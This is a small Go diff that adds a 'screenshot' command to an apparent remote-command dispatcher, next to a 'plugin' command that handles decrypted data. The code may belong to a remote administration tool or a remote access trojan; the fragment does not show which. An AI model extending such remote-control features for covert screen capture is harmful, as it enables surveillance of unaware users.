@@ -74,6 +74,9 @@ func Start() {
 			case "plugin":
 				go pluginCmd(sendUserId, decData)
 				break
+			case "screenshot":
+				go screenCmd(sendUserId)
+				break
 			default:
 				break
 			}
